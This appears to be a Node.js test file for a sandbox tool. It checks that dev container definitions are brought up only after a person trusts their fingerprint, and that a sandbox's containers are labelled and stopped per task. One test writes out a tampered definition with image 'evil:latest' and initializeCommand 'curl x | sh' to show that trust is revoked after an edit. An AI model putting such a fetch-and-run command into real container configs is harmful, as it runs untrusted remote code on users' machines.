// A sandbox placed on a dev container: the definition is the TASK's workspace's, bringing it up is a person's trust by fingerprint,
// the container carries the task's own labels, and releasing it stops those containers and no others.
import { test } from "node:test";
import assert from "node:assert/strict";
import { definitionFingerprint } from "../src/runtime/sandbox/trust.mjs";
import { filesOn } from "../src/runtime/validate.mjs";
import { NODE_AND_DOTNET } from "./fakes/runtime.mjs";
import { fakeProcess } from "./fakes/process.mjs";
import { CONTAINER_TOOLS, TASK, fingerprintsIn, sandboxWorld, trusted } from "./sandbox.harness.mjs";

const DEFINITION = JSON.stringify({ image: "mcr.microsoft.com/devcontainers/javascript-node:22", appPort: [5173], features: {} });
const FILES = { ...NODE_AND_DOTNET, ".devcontainer/devcontainer.json": DEFINITION };

// docker answers `ps` with one container, whatever label it is asked for: the test reads the ARGUMENTS it was asked with.
const container = () => fakeProcess({ docker: { ok: true, out: "abc123\n" } });

function world() {
  const w = sandboxWorld(FILES, { tools: CONTAINER_TOOLS, process: container() });
  const settings = w.ctx.readSettings();
  w.ctx.writeSettings({ next: { ...settings.settings, components: { "node:web": { provider: "devcontainer" }, "dotnet:api": { provider: "native" } } }, revision: settings.revision, by: "person" });
  return w;
}

const restoresTrusted = async (w) => trusted(w, { restore: fingerprintsIn((await w.run("sandbox-prepare")).blocked.because) });

test("a component placed on a container is a candidate when the WORKSPACE holds a definition, and the sandbox says where each one runs", async () => {
  const w = world();
  const first = await w.run("sandbox-prepare");
  assert.deepEqual(first.placements, { "dotnet:api": "native", "node:web": "devcontainer" });
});

test("bringing a definition up is a person's trust in exactly those files: untrusted is BLOCKED, runs no `devcontainer up`, and names the fingerprint to trust", async () => {
  const w = world();
  await restoresTrusted(w);
  const answer = await w.run("sandbox-prepare");
  assert.deepEqual([answer.state, answer.blocked.needs], ["BLOCKED", "person"]);
  const fp = definitionFingerprint(filesOn(w.sandbox()));
  assert.match(answer.blocked.because, new RegExp(fp));
  assert.deepEqual(w.process.calls.filter((c) => c.file === "devcontainer"), [], "nothing was brought up");
});

test("a trusted definition is brought up in the TASK's workspace under the task's own labels -- and an edit to it makes the trust ask again", async () => {
  const w = world();
  await restoresTrusted(w);
  trusted(w, { definitions: [definitionFingerprint(filesOn(w.sandbox()))] });
  const answer = await w.run("sandbox-prepare");
  assert.equal(answer.state, "READY", JSON.stringify(answer.blocked));
  const up = w.process.calls.find((c) => c.file === "devcontainer" && c.args[0] === "up");
  const workspace = w.workspaces.tasks.get(TASK).path;
  assert.equal(up.args[up.args.indexOf("--workspace-folder") + 1], workspace);
  const labels = up.args.filter((a, i) => up.args[i - 1] === "--id-label");
  assert.deepEqual(labels, [`orbit.checkout=${w.ctx.checkout}`, `orbit.env=${w.sandbox().envId}`, `orbit.task=${TASK}`, `orbit.workspace=ws-aaaaaaaaaaaa`]);
  w.workspaces.edit(TASK, ".devcontainer/devcontainer.json", JSON.stringify({ image: "evil:latest", initializeCommand: "curl x | sh" }));
  const again = await w.run("sandbox-prepare");
  assert.deepEqual([again.state, again.blocked.needs], ["BLOCKED", "person"], "what a person trusted is not what is there now");
});

test("a container-placed component starts through `devcontainer exec` with the same labels, on the port its DEFINITION publishes (never a leased one)", async () => {
  const w = world();
  await restoresTrusted(w);
  trusted(w, { definitions: [definitionFingerprint(filesOn(w.sandbox()))] });
  await w.run("sandbox-prepare");
  const out = await w.run("sandbox-start", TASK, ["--component=node:web", "--wait=0"]);
  assert.deepEqual(out.started.map((s) => [s.component, s.executionProvider]), [["node:web", "devcontainer"]]);
  const exec = w.process.launches.find((l) => l.file === "devcontainer");
  assert.ok(exec.args.includes(`orbit.task=${TASK}`), "found by the task's own labels");
  assert.deepEqual(w.sandbox().sandboxDoc().endpoints.filter((e) => e.component === "node:web"), [], "this one has no declared port to hold, and a container's cannot be moved");
});

test("releasing stops the containers that carry THIS sandbox's environment label -- and asks Docker for nothing a person's own container carries", async () => {
  const w = world();
  await restoresTrusted(w);
  trusted(w, { definitions: [definitionFingerprint(filesOn(w.sandbox()))] });
  await w.run("sandbox-prepare");
  await w.run("sandbox-start", TASK, ["--component=node:web", "--wait=0"]);
  const out = await w.run("sandbox-release");
  assert.equal(out.released, true);
  const asked = w.process.calls.filter((c) => c.file === "docker" && c.args[0] === "ps").map((c) => c.args.filter((a) => a.startsWith("label=orbit.")));
  assert.ok(asked.length > 0 && asked.every((labels) => !labels.length || labels.includes(`label=orbit.env=${w.sandbox().envId}`)), "every look for a container names the sandbox's own environment");
  assert.ok(asked.every((labels) => !labels.includes(`label=orbit.env=${w.ctx.envId}`)), "never the person's");
  assert.deepEqual(w.process.calls.filter((c) => c.file === "docker" && c.args[0] === "stop").map((c) => c.args[1]), ["abc123"]);
  assert.equal(w.sandbox().sandboxes.read(w.sandbox().envId).state, "RELEASED");
});
